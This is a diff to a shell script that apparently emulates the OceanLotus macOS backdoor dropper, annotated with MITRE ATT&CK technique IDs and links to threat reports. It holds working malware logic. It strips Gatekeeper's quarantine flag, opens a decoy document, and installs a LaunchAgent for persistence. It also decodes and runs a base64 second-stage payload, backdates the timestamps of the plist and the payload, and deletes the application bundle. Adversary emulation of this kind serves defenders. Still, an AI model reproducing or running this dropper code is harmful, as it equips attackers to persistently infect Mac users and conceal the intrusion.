@@ -8,11 +8,15 @@
 # MITRE ATT&CK Techniques:
 #   T1036.008 Masquerading: Masquerade File Type
 #   T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
+#   T1070.006 Indicator Removal: Timestomp
+#   T1543.001 Create or Modify System Process: Launch Agent
 
 # Resources:
 #   https://otx.alienvault.com/indicator/file/be43be21355fb5cc086da7cee667d6e7
 #   https://www.virustotal.com/gui/file/48e3609f543ea4a8de0c9375fa665ceb6d2dfc0085ee90fa22ffaced0c770c4f/detection
 #   https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
+#   https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/
+#   https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
 
 # Revision History:
 
@@ -34,7 +38,7 @@ temp_var="b2NlYW5sb3R1czIz"
 # remove quarantine flag on application bundle
 #   MITRE ATT&CK Techniques:
 #     T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
-# find . -exec xattr -d com.apple.quarantine {} + >/dev/null 2>&1 &
+find . -exec xattr -d com.apple.quarantine {} + >/dev/null 2>&1 &
 
 # get path to the application bundle
 parent_path_copy="$( dirname "$current_directory/$current_file" )"
@@ -45,9 +49,24 @@ execution_path="$( dirname "$parent_parent_path" )"
 # copy decoy doc to tmp and open it
 cp "$parent_parent_path/$TEMPPATH_IOP" "/tmp/$doc_name" && open -n "/tmp/$doc_name"
 
-# replace decoy doc in application bundle with decoded second stage, make executable, then attempt to execute in background
-echo $payload | base64 -D > "$parent_parent_path/$TEMPPATH_IOP" && chmod +x "$parent_parent_path/$TEMPPATH_IOP" && "$parent_parent_path/$TEMPPATH_IOP" >/dev/null 2>&1 &
+new_plist="$(sed -ne '/string/{s/.*<string>\(.*\)<\/string>.*/\1/p;q;}' $parent_path_copy/PkgInfo)"
+new_path="/$(sed -ne '/string/{s/.*<string>\/\(.*\)<\/string>.*/\1/p;}' $parent_path_copy/PkgInfo)"
+home_path="$( dirname "$execution_path" )"
+
+# create LaunchAgent plist
+#   MITRE ATT&CK Techniques:
+#       T1543.001 Create or Modify System Process: Launch Agent
+cp $parent_path_copy/PkgInfo "$home_path/Library/LaunchAgents/$new_plist";
+
+# replace decoy doc in application bundle with decoded second stage
+echo $payload | base64 -d > $new_path
+
+# update timestamp, make executable, then attempt to execute in background
+#   MITRE ATT&CK Techniques:
+#       T1070.006 Indicator Removal: Timestomp
+#       T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
+touch -t 1910071234 "$home_path/Library/LaunchAgents/$new_plist"
+touch -t 1910071234 $new_path && chmod 755 $new_path && $new_path >/dev/null 2>&1 &
 
 # remove application bundle then move decoy doc from tmp to the current execution path
-# sleep 5 ; rm -rf "$parent_path_copy" ; mv "/tmp/$doc_name" "$parent_parent_path/$doc_name" ;
 sleep 2 ; rm -rf "$parent_parent_path" ; mv "/tmp/$doc_name" "$execution_path/$doc_name" ;
